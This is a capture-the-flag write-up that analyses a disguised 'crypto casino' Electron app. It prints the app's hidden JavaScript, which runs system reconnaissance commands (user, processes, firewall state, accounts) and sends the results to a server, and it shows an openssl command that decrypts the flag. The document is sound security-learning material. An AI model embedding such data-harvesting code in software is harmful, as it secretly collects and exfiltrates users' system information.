# Perfectly Legit Crypto Casino
**Description:** I'm just finding out about this blockchain thing and it's awesome! I can gamble all I want with no consequences! Checkout my new favorite app!

## Solution

1. Looking at the contents of download, i first opened info.plist to get an idea of what I was working with and this appeared to be an Electron app.

    ```
    ...
    <key>CFBundleDisplayName</key>
    <string>dev</string>
    <key>CFBundleExecutable</key>
    <string>dev</string>
    <key>CFBundleIconFile</key>
    <string>electron.icns</string>
    <key>CFBundleIdentifier</key>
    <string>com.electron.dev</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundleName</key>
    <string>dev</string>
    ...
    ```

2. With that I moved on to the Resources folder and opened app.asar in vscode to see if I saw anything interesting at a glance.

3. Scrolling down a little I see this little snippet.

    ```javascript
    async function runMacOS() {
      doCommand(
        "echo U2FsdGVkX18dLoy5VJmru0jW8cEVgMQS5JYhHSk8D369laaZ7d7nBJXslDqS4CFoqIfwoKGM6Urhmx079RXgIA== | openssl enc -aes-256-cbc -d -a -pass pass:infected"
      );
      const commands = [
        ["username", "whoami"],
        ["hostname", "hostname"],
        ["ip", "hostname"],
        ["osys", "sw_vers -productVersion"],
        ["cpu", "sysctl -n machdep.cpu.brand_string"],
        ["ram", "sysctl -n hw.memsize"],
        ["gpu", "system_profiler SPDisplaysDataType | grep Chipset"],
        ["disk", "diskutil info / | grep Total"],
        ["network", "networksetup -listallhardwareports"],
        ["uptime", "uptime"],
        ["processes", "ps aux"],
        ["services", "launchctl list"],
        [
          "firewall",
          "defaults read /Library/Preferences/com.apple.alf globalstate",
        ],
        ["users", "dscl . list /Users"],
        ["groups", "dscl . list /Groups"],
      ];
      const info = await gatherSystemInfo(commands);
      sendToServer(info);
    }
    ```

    appears to collect information about the machine and there is also that strange command at the top

    ```
    echo U2FsdGVkX18dLoy5VJmru0jW8cEVgMQS5JYhHSk8D369laaZ7d7nBJXslDqS4CFoqIfwoKGM6Urhmx079RXgIA== | openssl enc -aes-256-cbc -d -a -pass pass:infected
    ```

4. After taking a closer look at above all we had to do was run the command above as all it simply decrypts the string being echoed and we get the flag.

    ```
    -d decrypt
    -a base64 decode
    -pass password
    ```

![win](https://media.giphy.com/media/3o6MbqNPaatT8nnEmk/giphy.gif?cid=790b7611u6sf2wb0ontrx9n38efg2upm3n2wuqy85xk5r49v&ep=v1_gifs_search&rid=giphy.gif&ct=g)